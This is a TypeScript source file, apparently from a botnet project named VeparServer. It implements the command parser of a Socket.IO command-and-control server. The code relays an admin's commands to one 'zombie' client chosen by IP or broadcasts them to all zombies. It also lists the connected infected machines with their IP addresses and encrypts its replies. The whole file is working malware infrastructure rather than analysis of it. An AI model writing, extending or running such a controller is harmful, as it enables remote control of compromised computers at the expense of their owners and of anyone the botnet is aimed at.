import { DefaultEventsMap, Server, Socket } from "socket.io";
import { VeparServer } from "..";
import { single_zombie_commands, all_zombie_commands } from "../constants/commands";
import CryptoModule from "../crypto/CryptoModule";

type Command = {
  aliases: string[];
  callback: (
    args: string[],
    socket: Socket,
    io?: Server<DefaultEventsMap, DefaultEventsMap, DefaultEventsMap, any>,
  ) => void | Promise<void>;
};

export default class CommandParser {
  private cmd: string[] = [];
  private io: Server<DefaultEventsMap, DefaultEventsMap, DefaultEventsMap, any>;
  private admin: boolean = false;
  private cryptoModule: CryptoModule;

  /**
   * Command Parser Constructor
   * @param io - The Socket.IO server instance
   * @param command - The command to parse
   * @param socket - The client socket that sent the command
   * @param admin - Indicates if the client is an admin
   */
  public constructor(
    io: Server<DefaultEventsMap, DefaultEventsMap, DefaultEventsMap, any>,
    command: string[],
    private socket: Socket,
    admin: boolean,
    cryptoModule: CryptoModule
  ) {
    this.cmd = command;
    this.io = io;
    this.admin = admin;
    this.cryptoModule = cryptoModule;

    const commands: Command[] = [
      {
        aliases: ["ignore", "message"],
        callback: (args: string[]) => this.sendMessageToSpecificClient(args, process.env.DASHBOARD_IP as string, this.io),
      },
      {
        aliases: ["ping", "check", "hello"],
        callback: (args: string[]) => this.ping(args, this.socket),
      },
      {
        aliases: ['test'],
        callback: (args: string[]) => this.test(args, this.socket),
      },
      {
        aliases: single_zombie_commands.flat(),
        callback: (args: string[]) => this.commandToSingleZombie(args, this.socket),
      },
      {
        aliases: all_zombie_commands.flat(),
        callback: (args: string[]) => this.commandToAllZombies(args, this.socket),
      }
    ];

    commands.map(async (current_cmd: Command): Promise<void> => {
      if (current_cmd.aliases.includes(this.cmd[0].toLowerCase())) {
        await current_cmd.callback(this.cmd.slice(1), this.socket, this.io);
      }
    });
  }

  /**
   * Logs messages to the console
   * @param message - The message to log
   */
  private sendLog(message: string) {
    console.log(message);
  }

  /**
   * Handles ping command and returns connected clients
   * @param args - Command arguments
   * @param socket - The socket of the requesting client
   */
  private async ping(args: string[], socket: Socket): Promise<void> {
    if (!this.admin) return;

    this.sendLog("COMMAND: Ping executed.");
    const clients = Array.from(this.io.sockets.sockets.values()).map((clientSocket) => {
      const ip = clientSocket.handshake.address.replace('::ffff:', '').replace('::1', '127.0.0.1');
      return `${clientSocket.id} (${ip}) ${ip.includes(process.env.DASHBOARD_IP as string) ? '[ADMIN]' : '[ZOMBIE]'}`;
    });

    socket.emit("message", this.cryptoModule.encrypt(clients.length === 0 ? "No clients connected." : `Connected clients: \n - ${clients.join("\n - ")}`));
  }

  /**
   * Test command handler
   * @param args - Command arguments
   * @param socket - The socket of the client who sent the command
   */
  private async test(args: string[], socket: Socket): Promise<void> {
    return this.socket.emit('message', 'Test!!') as unknown as void;
  }

  /**
   * Sends a command to a single zombie
   * @param args - Command arguments
   * @param socket - The socket of the client who sent the command
   */
  private async commandToSingleZombie(args: string[], socket: Socket): Promise<void> {
    if (!this.cmd[1]) return;

    const cmd_parsed = [...this.cmd];
    cmd_parsed.splice(1, 1);

    this.sendLog(`${this.cmd[1]} | COMMAND: ${args[0]}`);
    return this.sendMessageToSpecificClient(cmd_parsed, this.cmd[1], this.io);
  }

  /**
   * Sends a command to all zombies
   * @param args - Command arguments
   * @param socket - The socket of the client who sent the command
   */
  private async commandToAllZombies(args: string[], socket: Socket): Promise<void> {
    this.sendLog('ALL | COMMAND: ' + args[0]);
    return this.io.emit('message', this.cmd.join(' ')) as unknown as void;
  }

  /**
   * Sends a message to a specific client identified by IP
   * @param args - Command arguments
   * @param targetIp - The target client IP address
   * @param io - The Socket.IO server instance
   */
  private async sendMessageToSpecificClient(
    args: string[],
    targetIp: string,
    io: Server<DefaultEventsMap, DefaultEventsMap, DefaultEventsMap, any>,
  ): Promise<void> {
    const message = args.join(' ');
    const targetSocketId = Array.from(VeparServer.clientIPs.entries()).find(([_, ip]) => ip === targetIp)?.[0];

    if (targetSocketId) {
      io.to(targetSocketId).emit("message", message);
      this.sendLog(`Message sent to ${targetIp}: ${message}`);
    } else {
      this.sendLog(`No client found with IP: ${targetIp}`);
    }
  }
}
